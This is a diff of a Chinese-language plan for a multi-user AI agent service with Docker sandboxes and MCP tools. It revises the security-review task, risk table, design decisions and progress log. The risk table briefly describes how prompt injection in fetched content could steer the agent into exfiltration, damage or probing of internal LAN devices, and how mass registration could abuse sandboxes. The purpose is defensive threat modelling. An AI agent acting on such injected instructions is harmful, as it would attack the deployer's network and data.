+| T13.7 | 安全审查：逐条核 §8（越权、symlink、SSRF、secret 泄漏、CSRF、bypass policy、**配置目录写权限演练**：以 service 身份尝试改 `config/permissions.yaml` 应失败）。r3 新增三项演练：① **无 admin 的越权面** —— 枚举所有返回数据的端点，断言不存在可用他人 id 作参数的查询（`/capabilities` 外一律按 principal 取数）；② **注册滥用演练** —— 脚本批量注册 50 账号并各起 1 个 run，验证 per-IP 限速、`max_live_containers`、`global_hourly_tokens` 三道闸门各自在预期位置拦住且错误可读；③ **网络模式演练（D8 之后的新形态）** —— 三档各跑一次，断言缺省即 `none`（不设任何 local 覆盖时容器 `getent hosts`/出网全失败）、`internal` 下出网失败、`per_user_bridge` 下跨用户仍不可达；**并跑一次"全程无网冒烟"**：在 `none` 下走完 建号→对话→read/write/grep/bash→工具审批 的完整链路，任何一步偷偷依赖网络（镜像缺工具、pip 拉包、DNS 查询）都算缺陷；同时确认 `http_fetch`（host 侧，不受容器网络模式约束）的不对称已写进文档（T6.7） | 三项演练各有可重复脚本；findings 清零或转为新 TODO | ⬜ |
 
 ### 延后（v1.1+，不在本计划审批范围）
 
@@ -591,71 +604,71 @@ docker compose up   # 生产形态：service + web（config 目录只读挂载�
 
 | 风险 | 影响 | 缓解 |
 |---|---|---|
-| 改配置要 reload/重启，迭代慢 | 运维摩擦、误以为改了没生效 | `/admin/config/reload` 即时生效 + `GET /config/report` 显示 version/sources sha256 + run 记 `config_version`；`config/README.md` 给"加一个能力要改哪几个文件"清单 |
+| 改配置要 reload/重启，迭代慢 | 运维摩擦、误以为改了没生效 | `kill -HUP <pid>` 即时生效（§7：不再有 HTTP reload 端点，因为无 admin 角色且开放注册）+ `python -m app.config dump` 显示 version/sources sha256 + run 记 `config_version` 可回查当时快照 + 日志打印 reload 结果；`config/README.md` 给"加一个能力要改哪几个文件"清单 |
 | `config/` 写权限成为新的提权面（等价于改权限规则） | 一次误配（world-writable、容器可写挂载）= 能力可被篡改 | §8.7：只读挂载 + 属主检查 + world-writable 拒绝启动 + CI `config-check`；T13.7 演练"以 service 身份改配置必须失败" |
 | 多环境配置漂移（`*.local.yaml` 不入库） | 线上行为与仓库不一致、难复现 | local 覆盖需显式 `CONFIG_ALLOW_LOCAL=1`；snapshot 记录每个来源的 sha256 并写进 `run.params_json`；report 可 diff |
-| 无法 per-user 定制能力，所有用户共享一套 | 多租户场景受限（明确接受） | 写进 §1.2 非目标；将来若要 → 评估"按 role 分组的多快照"而不是回到 DB 配置 |
-| provider key 全局共享 → 花费无法按用户区分账户 | 计费/隔离诉求落空 | `usage` 仍按 user 记 token；账户级隔离需求见 §13-Q2，需单独决策 |
+| 无法 per-user 定制能力，所有用户共享一套（r3 起连 role 都没有） | 多租户场景受限（明确接受） | 写进 §1.2 非目标；将来若要 → 按"分组→多 `ConfigSnapshot`"扩展（配置仍是文件，只是允许 `settings.groups.<name>` 覆盖 enabled 集合），而不是回到 DB 配置或应用内角色 |
+| provider key 全局共享 → 花费无法按用户区分账户（**§13-D2 已确认接受**） | 计费/隔离诉求落空；更糟的是"一个用户的花费吃掉所有人的额度" | `usage` 按 user 记 token（归属可查，只是钱出自同一账户）；**`global_hourly_tokens` 账户级熔断 + per-user `daily_token_budget`**双层（§8.10，T13.4 有专门的多用户合计击穿用例）；若将来真需要按用户计费 → 必须重开 per-user 凭据，与 ADR-015 冲突，属重新决策 |
 | 装配面在启动期变重（连 MCP、扫 skills/agents、建 hook 总线） | 启动变慢、单个坏 server 拖垮启动 | 连接超时 + 失败降级为 disabled（T11.2）、启动并行化、report 里明确列出失败项 |
 | Docker daemon 不可用 → 工具全部失效 | 开发/部署断裂 | `Sandbox` protocol + `FakeSandbox`（测试）与 `LocalSandbox`（dev，显式 env 开启）；启动探测给明确错误 |
+| **开放注册 × 一把 key × 每人一个容器**（§13-D3 的直接后果） | 陌生人批量开号 → 账户 token 被吃穿、宿主内存被容器耗尽、沙箱被拿去挖矿/当跳板 | 三道闸门（§8.10/§8.11）：注册 per-IP 限速与每日配额、`global_hourly_tokens` 熔断、`sandbox.max_live_containers` + LRU；`registration.open` 可关，且 `config-check` 在"公网监听 + open=true"时报 error，逼部署者显式确认 |
+| **部署环境出网能力差异大**（公共 registry / 默认 PyPI 在部分环境不可达，需要 mirror 或代理） | `docker build`、容器内 `pip install`、`docker pull` 会在"网络明明已放开"的配置下静默失败，排障成本高 | mirror 源与基础镜像 tag 可配置注入（`apt_mirror`/`pip_index_url`/`base_image`，T6.3）+ 构建失败报错需指名失败源。缺省档 `none`（D8）下这条只影响 **build 期**与"显式开网络后"的运行期 |
+| **放宽网络后沙箱可达同网段内网设备** | agent 经 prompt injection 可探测/攻击内网设备：路由器管理页、NAS、内网 HTTP 服务；这是"给容器开网络"最被低估的代价 | **缺省档为 `none`（D8）**，该风险仅在部署者显式改 `settings.yaml` + SIGHUP 后成立；bash 保持默认 `ask`；`http_fetch` 是 host 侧工具、不受容器网络模式约束，其 SSRF/allowlist 事实**写进文档不掩饰**（T6.7）；不在应用层假装做内网过滤 |
+| **`none` 默认档的功能代价** | agent 不能 `pip install`/`npm i`/`git clone`；镜像缺的工具就是缺的；用户会看到"莫名其妙装不上依赖"的失败 | 工具链预烘焙进 `sandbox/image/Dockerfile`（T6.3）+ `docs/sandbox.md` 说明"加依赖 = 改 Dockerfile + `make sandbox-build`"；bash/命令失败时把 `ENETUNREACH`/`EAI_AGAIN` 翻译成"沙箱无网络，如需网络请改配置"的可读提示（T6.6）；网络模式是配置项不是运行时协商，切换要留审计 |
 | 事件溯源数据膨胀 | DB 变大、重放变慢 | `visibility=internal` 分离、delta 批量落库（T2.3）、retention 裁剪（T13.5） |
 | in-process run 监督与多 worker 冲突 | run 丢失/重复 | v1 强制单进程（启动时检测 `--workers>1` 即拒绝），ADR-014 |
 | SSE 断线重放语义错乱 | UI 丢字/重复字 | cursor 全局单调 + 前端按 `(run_id,seq)` 去重 + `Last-Event-ID` 严格重放测试（T5.1） |
 | 权限"自批"漏洞 | 提权 | 无 `always` 档、run 内不写规则文件、resolve 必须带用户身份、session grant 只在内存 + `audit_log`（T7.4/T8.2） |
 | MCP/插件引入任意代码执行 | 服务权限泄漏 | trust 来自 `plugins.yaml`（需评审）+ command hook 无 shell + 脚本可写性校验 + 资源标签审计（T12.4/T12.5） |
-| **mcp SDK 的依赖与导入面比规划时估的大**（37→61 包；`cryptography` 15MB；且 client 入口会连带载入 59 个 `mcp.server.*` 模块，启动 RSS +35.9MB） | 传递依赖纳入长期审计（`cryptography` 有原生 `_rust` 绑定、历史 CVE 需要跟）；进程里存在我们不执行的 server 代码，误用面变大 | 影响可接受，**不设守卫**（实测证明 import 级约束不可执行，见 ADR-007）。口径改为：不实现自己的 MCP server；`cryptography` 不作直接依赖；升级 mcp 前先看 `uv pip tree` 的增量与 `pyjwt[crypto]` 是否仍被 client 拉入 |
+| **mcp SDK 的依赖与导入面较大**（本仓库 37→61 包；client 入口会连带载入整个 `mcp.server` 代码树） | 传递依赖（含 `cryptography`，带原生绑定、历史 CVE 需跟踪）纳入长期审计；进程里存在我们不执行的 server 代码，误用面变大 | 影响可接受，**不设 import 级守卫**（该约束不可执行，见 ADR-007）。口径改为：不实现自己的 MCP server；`cryptography` 不作直接依赖；升级 mcp 前先看 `uv pip tree` 的增量与 `pyjwt[crypto]` 是否仍被 client 拉入 |
 | prompt injection 通过抓取内容操纵工具 | 外泄/破坏 | §8.5 包裹标记 + 敏感工具默认 ask + SSRF 过滤 + 输出 redact |
 | SQLite 写锁竞争 | 并发 run 下写延迟抖动；等待超过 `busy_timeout=5000ms` 时请求返回 5xx | 单写者 executor + WAL + busy_timeout + delta 批量落库 + per-user 并发上限 |
 | **service 容器挂 `/var/run/docker.sock`** | socket == 宿主 root：service 一旦被攻陷即可起特权容器读走全部用户数据与 `vanilla.db`，§8.4 的跨用户隔离失效 | v1 让 service 跑在宿主机（systemd），compose 只装 web；必须容器化时改用受限 socket 代理 / 独立 rootless daemon（§8.4、T13.6） |
-| **运行时数据与本地配置被误提交** | `pw_hash`、session token、对话正文、用户 agent 产物进入 git 历史（仓库当前零提交，首次 `git add -A` 即触发） | T0.1 补 `.gitignore` + `git check-ignore` 守卫用例 + `config-check` 扫描未跟踪的 `*.local.yaml` |
+| **运行时数据与本地配置被误提交** | `pw_hash`、session token、对话正文、用户 agent 产物一旦进入 git 历史就长期可恢复，撤销成本远高于预防成本 | `.gitignore` 覆盖已落实（T0.1a）+ `git check-ignore` 守卫用例（T0.4）+ `config-check` 扫描未跟踪的 `*.local.yaml` |
 
 ---
 
-## 13. 待确认的开放问题
+## 13. 决策与开放问题
 
-1. **模型与 provider**：默认 model id？是否要接 Azure OpenAI / 自建兼容网关（`base_url` 之外鉴权方式不同，需扩 `settings.yaml`）？→ 影响 T4.2。
-2. **provider 凭据是否只有一把（全局 env）**：r2 之后 per-user API key 无处安放（配置不入库、用户不可改）。若需要按用户计费/隔离，要么接受"配置里有 per-user key 映射文件"（仍是文件），要么重开 per-user secret 入库。**更新（T0.1b 后）**：`cryptography` 已随 mcp 进入依赖树，所以这条路**不再需要新增依赖**，只需要引入主密钥管理（keyring/KMS/env）——门槛比我原先估的低，但它直接违背 ADR-015 的"配置不入库"，属于要重新决策而非顺手实现的事。→ 影响 M3/M13。
-3. **注册流程**：开放注册 / admin 邀请制（邀请本身是 DB 还是文件？倾向 DB，因为它是"用户记录"不是"能力配置"）/ 仅 `seed_admin.py` 手工建号？→ 影响 T3.3。
-4. **`session` 授权的存活边界**：当前定义为"同一 thread 内、直到进程重启或 reload 失效"。是否改成"登录会话期"或加显式 TTL（如 2h）？→ 影响 T7.4。
-5. **容器网络**：默认 `--network none` 下 `pip install` 不可用。是提供 `settings.yaml` 的 per-run 申请（需 admin 批准 → 但审批对象是运行时不是配置）还是让用户提 PR 到 `settings.yaml`？→ 影响 T6.4。
-6. **配置变更工作流**：审批时只给"建议规则 YAML 片段"（当前设计）。是否要进一步做"一键生成 patch 文件到 `data/proposed/`"（仍不生效、仍需人工提交）？→ 影响 T7.5/T8.5。
-7. **`event_log` 保留期与 thread 导出**（JSON/Markdown）。→ 影响 T13.5。
-8. **`cost_usd` 是否需要单价表**（provider 定价随模型变化）；v1 可只报 token。→ 影响 T13.4。
-9. ~~部署形态~~ **已决定（2026-11-20）**：service 跑宿主机、`docker-compose.yml` 只装 web、不挂 `docker.sock`（§8.4 / T13.6）。将来若必须容器化 service，需单独评估受限 socket 代理，届时 T6.4 的沙箱交互层要回头适配。
-10. ~~首次提交前的仓库卫生~~ **已解决（T0.1a）**：`.gitignore` 加固 + 下限收紧已落地并进入首次提交。遗留提醒：**空的 `service/tests/` 不被 git 跟踪**，第一个测试文件落地时才进版本库（T0.1b/T0.4 会自然产生）。
+### 13.1 已决定（r3，2026-11-20 由用户确认；每条都能追溯到正文改动）
+
+| # | 决定 | 落到哪 |
+|---|---|---|
+| **D1** | provider 只需 **`base_url` + `api_key` + `model_name` + 通用默认参数**（temperature/max_tokens/top_p/超时/重试/allowed_models）。**不接 Azure OpenAI**（api-version、deployment 路由、AAD token 都不实现） | ADR-001、§5 `settings.yaml`、T4.2 |
+| **D2** | **凭据只有一把**（全局 env，`${env:OPENAI_API_KEY}` 引用）。接受"花费无法按用户区分账户" | ADR-001、ADR-015 代价句、§8.10、T13.4 |
+| **D3** | **开放注册，且没有 admin 角色**（无邀请码、无首账号特权；`users.role` 取消；配额/禁用走运维 CLI） | ADR-004、ADR-011、§6、§7（无 `/admin/*`；reload→SIGHUP；`/config/report`→CLI；新增 `/capabilities`）、§8.2、§8.11、T1.8、T3.2、T3.3、T3.4、T13.7① |
+| **D4** | `session` 授权存活边界**维持现定义**：同一 thread 内、进程重启或 reload（SIGHUP）即失效，不加额外 TTL | ADR-009、§4 `SessionGrantStore`、T7.4 |
+| **D5** | **容器网络支持"设置为可访问"**（能力保留）：`settings.sandbox.network_mode` 三档；放宽档下必须每用户一张自定义网络（跨用户不可达与 `internal` 阻断出网都是 T6.4 的验收断言）；出网能力依赖部署环境，故 mirror 源可配置注入（主要影响 build 期） | ADR-005、§8.4、§12 风险行、T6.3、T6.4、T6.7、T13.7③ |
+| **D8** | **缺省档 = `none`（最严，连内部 DNS 都不要）** —— 原则：默认状态不应把同网段内网设备纳入 agent 的可达面，开网络必须是显式、可审计的决定。连带三条硬要求：① 镜像必须预烘焙工具链（运行期装不了包）；② `none` 下网络类失败要被翻译成可读提示（T6.6）；③ 必须有一条"全程无网冒烟"，防止功能偷偷依赖网络（T13.7③）。放宽到 `internal`/`per_user_bridge` = 改 `settings.yaml` + `kill -HUP`，即每次开网络都是一次有记录的配置变更 | ADR-005、§5、§8.4、§12 两行、T1.5、T6.3、T6.4、T6.6、T13.7③ |
+| **D6** | **配置变更工作流维持现设计**：审批时给"建议规则 YAML 片段"供人工提交，不做自动生成 patch 文件、不做 PR 自动化 | ADR-009、T7.5、T8.5 |
+
+### 13.2 仍开放（不阻塞 M0，但都带明确的"什么时候必须回答"）
+
+7. **`event_log` 保留期与 thread 导出**（JSON/Markdown）。→ 影响 T13.5；回答时机：retention 实现前。
+8. **`cost_usd` 是否需要单价表**（provider 定价随模型变化）；v1 可只报 token。→ 影响 T13.4；回答时机：做 `/usage/summary` 时。
+9. **公网部署时注册是否需要额外门禁**（邮箱验证 / 域名 allowlist / 手工审批首账号）。当前只有 per-IP 限速与每日配额（§8.11）——那是"减缓批量开号"，不是"只有真人能注册"。如果这服务会暴露到公网，这一条必须回答；只在受信任内网用可以先不答。→ 影响 T3.3/T3.4。
+10. ~~部署环境的内网信任度假设~~ **已由 D8 关闭**：缺省档定为 `none`，放宽需显式改配置 + SIGHUP。衍生事项 —— "哪些工具链必须预烘焙进镜像"变成 `docs/sandbox.md` 里一份要长期维护的清单（T6.3），不再是"agent 自己 pip install 就行"的乐观假设。
+
+### 13.3 此前轮次已关闭（保留以便追溯编号）
+
+| # | 结论 | 落到哪 |
+|---|---|---|
+| **D7** | 部署形态：service 跑**宿主机**、`docker-compose.yml` 只装 web、**不挂 `/var/run/docker.sock`**（socket == 宿主 root）。将来若必须容器化 service，需单独评估受限 socket 代理，届时 T6.4 的沙箱交互层要回头适配 | ADR-005、§8.4、T13.6 |
+| C1 | 首次提交前的仓库卫生：`.gitignore` 加固 + 下限收紧已落地并进入首个提交（T0.1a ✅）。遗留提醒：**空的 `service/tests/` 不被 git 跟踪**，第一个测试文件落地时才进版本库（T0.4 起自然产生） | §8.6、T0.1a、T0.4 |
 
 ---
 
 ## 14. 进度日志
 
-- 2026-11-17：仓库为脚手架（`service/pyproject.toml` + 空 `tests/`，`web/` 空）。探测环境：Python 3.12.3、SQLite 3.45.1、`hashlib.scrypt` 可用、Docker 29.8.1 daemon（cgroup v2 / runc 1.5.1）、Node 24.21、npm 11.19、uv 0.12.21、`rg` 存在、`sqlite3` CLI 缺失（用 stdlib）。
-- 2026-11-17：确认四项关键选型（官方 mcp SDK / 多用户+会话 / Docker 隔离 / 前端 v1 = 聊天+审批），定稿 r1（13 里程碑 / 69 TODO）。
-- 2026-11-20：**r2 修订** —— 按指令将 skills / tools / subagents / MCP / plugins / permissions / hooks 的配置全部改为仓库文件（ADR-015），不入 DB、不提供修改端点、用户不可改。影响面：新增 M1 配置层（8 TODO，含快照、合并规则、config-check、信任边界、只读诊断 API）；DB 表 25→14（删 `permission_rule/skill/subagent_def/mcp_server/mcp_tool/plugin/plugin_resource/hook/secret/settings/sandbox_release`）；去掉 `cryptography` 依赖与 `SECRET_MASTER_KEY`；权限 `always` 档删除、`session` 授权改为进程内 TTL；API 表移除全部配置写端点，仅存 `POST /admin/config/reload`；新增 §5 配置文件规范、§8.7 配置信任边界；里程碑 14 个 / TODO 80 个；开放问题重写为 8 条（新增 per-user key、session grant 生命周期、配置变更工作流三项）。**尚无 TODO 开工**。
-- 2026-11-20：**r2.1 修订**（`/code-review medium` 结果落地，10 条中 9 条成立并修复，1 条为 review 自身算错）：
-  - **§8.6 + T0.1（原为设计漏洞）**：`.gitignore` 实际不含 `config/*.local.yaml`、`/data/`、`web/node_modules/`、`web/.next/`，而文档声称"已 gitignore"。仓库零提交 → 首次 `git add -A` 会把 `pw_hash`、session token、对话正文写进历史。已把仓库卫生并入 T0.1 的产出与验证（`git check-ignore` 断言）。
-  - **§7（原为鉴权漏洞）**：`除 /auth/* 外均需 session` 会连带豁免 `POST /auth/password`（改密码）与 `GET /auth/me`，与 T3.2 期望的"未登录 401"自相矛盾。改为显式白名单：仅 `login`/`signup`/`healthz` 免 session。
-  - **§8.3 + T3.4（原为死锁）**：CSRF double-submit 覆盖 `login`，而无 cookie 的新客户端永远拿不到第一个 token。改为豁免 `login`/`signup` 并明确 token 签发点；T3.4 验证项随之重写，避免把死锁固化进测试。
-  - **§8.4 + T13.6 + §12（原为隔离承诺失真）**：容器化 service 又要点沙箱容器 ⇒ 必须挂 docker socket ⇒ 等同宿主 root，跨用户隔离崩塌。v1 改为 service 跑宿主机、compose 只装 web；新增风险行与 §13-Q9。
-  - **§4**：`EventType(StrEnum)` 原写法（`A, B, C` 裸成员）不是合法枚举，且 T5.3 的 TS 生成依赖成员 value → 会生成空 union。改为 `MEMBER = "dotted.name"` 全量形式并加注释。
-  - **§11**：删掉 `SESSION_SECRET`（会话是 opaque token + sha256 查表校验，没有需要签名的载荷，留着会让 T0.2 fail-fast 校验一个无消费者的变量）。
-  - **T0.1/T4.2**：`openai` 下限从 `>=1.55` 收紧到 `>=3.51`（chunk/usage 归一化按 3.51 语义验证），同收 `fastapi`/`uvicorn` 下限。
-  - **T0.1/T0.4 验证门槛修正**：实测 `tests/` 为空时 `pytest` 退出码 **5**（"no tests ran"），原写"pytest 通过"是不可执行的门槛；改为允许 0 或 5，`make test` 同理。
-  - **§2/§6 事实修正**：r1 表基数是 25 不是 23（25 − 11 = 14，与 §6 逐行核对一致）。review agent 报的"23−11=14 ✓"是它自己没检查的不一致。
-  - 开放问题增至 10 条（新增部署形态、首次提交前的仓库卫生）。
-- 2026-11-20：**r2.2 —— 首个 TODO 开工（T0.1a）+ 部署形态定稿**。用户批准范围明确限定为"只做仓库卫生"，因此 T0.1 拆成 **T0.1a（仓库卫生 + 版本下限，已完成）** 与 **T0.1b（新增 pydantic-settings/pyyaml/mcp + dev 工具链，待批）**，TODO 总数 80 → 81。
-  - T0.1a 实际改动：`.gitignore`（+23 条：`/data/`、`config/*.local.yaml`、`*.db`/`-shm`/`-wal`、`web/node_modules|\.next|out|next-env.d.ts`、`*.tsbuildinfo`、`.mypy_cache/`、`.ruff_cache/`、`.env.*`）、`service/pyproject.toml`（`openai 1.55→3.51`、`fastapi 0.115→0.163`、`uvicorn 0.32→0.54` 下限 + 约定注释）、`service/uv.lock`（重解）。
-  - 验证结果：`git check-ignore -v` 8 条敏感路径全部命中；`uv lock` 解析未变（37 包，openai 3.51.0），`uv sync` 无变更；`git add -A --dry-run` 显示首次提交只含 6 个文件（`.gitignore`/`CLAUDE.md`/`README.md`/`docs/plan.md`/`pyproject.toml`/`uv.lock`），无 `.venv`、无 db。
-  - 刻意没有做的（超出批准范围）：不新增任何依赖、不写 `app/` 代码、不建 `tests/` 用例。`.gitignore` 里 `*.db` 用全局式而非仅 `/data/*.db`，理由与反选口子写在文件注释里；hygiene 守卫用例排入 T0.4（此时才有 `tests/` 可进版本库 —— 空目录 git 不跟踪）。
-  - §13-Q9（部署形态）与 Q10（仓库卫生）关闭：service 定为宿主机进程，compose 只装 web，不挂 docker socket。
-- 2026-11-20：**r2.3 —— T0.1b 完成，同时发现并更正了我自己写错的一条事实**。
-  - 改动：`service/pyproject.toml`（新增 `pydantic-settings>=2.16.3`/`pyyaml>=6.0.3`/`mcp>=2.3.0` + dev 组 `ruff>=0.17.6`/`mypy>=2.4.1`/`pytest-asyncio>=1.5.0`/`pytest-cov>=7.1.0`/`jsonschema>=4.26.0`；补 `asyncio_mode="auto"` 与 `asyncio_default_fixture_loop_scope="function"`）、`service/uv.lock`（37→61 包）。下限全部取 `uv add` 解析出的实测值，符合 T0.1a 立的"下限=实测版本"约定。
-  - **我写错的验证式**：T0.1b 原要求 `grep -c 'name = "cryptography"' uv.lock` = 0，实测**不成立** —— `mcp 2.3.0` 硬声明 `pyjwt[crypto]`，把 `cryptography 50.0.2` 带进了树（`mcp/server/request_state.py` 用它做 AESGCM+HKDF）。处理方式不是把断言放宽，而是：承认 ADR-015 的立场仍成立（无主密钥、无 Fernet、非直接依赖），把断言从"包不存在"改成"我们不用它"，并拆出 **T0.1c** 落地为正向守卫（`app/**` 禁 import `cryptography`/`mcp.server` + `pyproject` 两列表禁列 `cryptography`）。同时新增约束"**只用 mcp client 侧**"（ADR-007）与一条风险行（§12）。
-  - 顺带发现：`pytest-asyncio` 装上后未配置就每次运行脏一条 `PytestDeprecationWarning` —— 属于加依赖的应收尾，故在本次一并配好，现在 `pytest -q` 输出**零 warning**、退出码 5（`tests/` 仍空，如 T0.1a 所述空目录不被 git 跟踪）。
-  - 验证记录：导入检查通过；`uv lock --check` 干净；关键包零降级（fastapi 0.163.1 / starlette 1.10.0 / pydantic 2.14.3 / openai 3.51.0 / uvicorn 0.54.0 / httpx 0.28.1 / anyio 4.16.0）。
-  - 纪律：本次没有新增任何 `app/` 代码、没做"顺手"重构、没扩到 T0.2 的配置层。
-  - 工作约定变更：`CLAUDE.md` 新增两条（不改 `.env*`；commit message 不带 attribution）。已按新约定把首个 commit `2cce816` amend 为 `467532d` 去掉 `Co-Authored-By`（仓库未推送，`git reflog` 可回退）。
-- 2026-11-20：**r2.4 —— 用实测否证了 r2.3 自己加的一条"硬约束"，撤销 T0.1c**。被追问"cryptography 多一个包到底有什么影响"之后去量，而不是继续论证：
-  - **量级**：`cryptography` 磁盘 15MB（vs `mcp` 3.0M、`jsonschema` 736K、`pydantic_settings` 720K、`cffi` 424K），venv 共 181MB；`jwt` 未进入 `sys.modules`（OAuth/JWT 是懒加载）。**功能与安全影响≈0** —— 我们不执行它的任何代码路径，`request_state` 的 AESGCM key 只有真跑 server 时才存在。
-  - **但有一条不是"只是多个包"**：`mcp/client/client.py` → `client/_memory.py:13` → `from mcp.server import Server`，即 **SDK 的 client 包在模块级 import 了 server 包**。逐进程实测（每个进程只 import 一个入口，避免载树顺序干扰）：`mcp.client.stdio` / `.session` / `.streamable_http` 全部 → `mcp.server.*` 59 个模块 + `cryptography`，**启动 RSS +35.9MB**。
-  - **因此我上一轮写的约束不可执行**：T0.1c 的守卫要断言"`app/**` 无 `mcp.server` import" —— 我们自己的代码确实不会有，但"只用 client 侧"这件事无法用 import 图证明，也没必要证明。处理：**删除 T0.1c**（TODO 82→81），把 ADR-007 的"硬约束"改写为两条可评审口径（不实现自己的 MCP server；`cryptography` 不作直接依赖），§12 风险行的措辞从"多出我们要管的密钥"改为"依赖审计面 + 进程内存在不执行的 server 代码"。
-  - 教训写在这里以免重犯：**验证式必须断言"我们能负责的东西"**。`grep cryptography uv.lock = 0` 断言的是一个不由我们决定的传递事实；`禁止 import mcp.server` 断言的是一个 SDK 内部已违反的不变量。两者都会在实现日"失败"，而失败原因不可修 → 这类断言在写下前就该问一句"谁负责让它成立"。
+> 这里只记**变更内容 + 在本文的落点**。决策理由、验证过程的叙述属于会话与评审记录，不写进仓库；仓库文件也不记录任何部署环境的具体信息（主机名 / IP / 资源规格 / 绝对路径 / 内网 mirror / 本地镜像名等）—— 规则见 CLAUDE.md「文档的隐私与可移植性」。
+
+- **2026-11-17 r1**：初版规划，13 里程碑 / 69 TODO。四项选型：官方 mcp SDK、多用户 + 会话、Docker 沙箱隔离、前端 v1 = 聊天 + 审批（ADR-001…014）。
+- **2026-11-20 r2**：装配面（skills / tools / subagents / MCP / plugins / permissions / hooks）全部改为仓库配置文件（ADR-015、§5）；DB 表 25→14（§6）；新增 M1 配置层；删除权限 `always` 档、`session` 授权改为进程内 TTL（ADR-009、§4）；里程碑 14 个。
+- **2026-11-20 r2.1**（文档自审）：鉴权豁免改为显式白名单（§7）；CSRF 豁免登录/注册并明确 token 签发点（§8.3、T3.4）；`EventType` 改为合法 StrEnum 写法（§4）；删除无消费者的 `SESSION_SECRET`（§11）；部署形态定为 service 跑宿主机（§8.4、T13.6）；`.gitignore` 与依赖下限修正并入 T0.1；"空 `tests/` 时 pytest 退出码 5"写进验证门槛（T0.1/T0.4）。
+- **2026-11-20 T0.1a ✅**：`.gitignore` 加固 + 依赖下限收紧到实际解析版本。验证见 T0.1a 行。
+- **2026-11-20 r2.3 / T0.1b ✅**：新增 `pydantic-settings` / `pyyaml` / `mcp` 与 dev 工具链；补 `pytest-asyncio` 配置。验证见 T0.1b 行。
+- **2026-11-20 r2.4**：撤销 T0.1c —— mcp 的 client 包在模块级 import server 代码树，import 级约束不可执行。结论落在 ADR-007 与 §12。
+- **2026-11-20 r3**：六项开放问题定案（§13.1 D1–D6）。provider 仅 `base_url`/`api_key`/`model_name` + 通用参数、不接 Azure（ADR-001）；凭据全局一把（§8.10）；**开放注册且无 admin 角色**（ADR-004、§6、§7、§8.2、§8.11）；`session` 授权维持 thread 内（D4）；容器网络三档可配（D5）；配置变更维持"建议片段"（D6）。运维动作改走 shell（SIGHUP + CLI），用户侧新增脱敏 `GET /capabilities`。
+- **2026-11-20 r3.1（D8）**：沙箱网络**缺省档定为 `none`**（§5、§8.4、T1.5 / T6.3 / T6.4 / T6.6 / T13.7③）。连带三条要求：镜像预烘焙工具链、网络失败可读化、必须有一条"全程无网冒烟"。§13 重组为 13.1 / 13.2 / 13.3。
+- **2026-11-20 r3.2**：清除本文中的部署环境指纹与决策过程叙述，§14 重写为本变更索引；相应规则写入 CLAUDE.md。
+- **待办**：M0 剩余 T0.2–T0.5；开放问题见 §13.2。
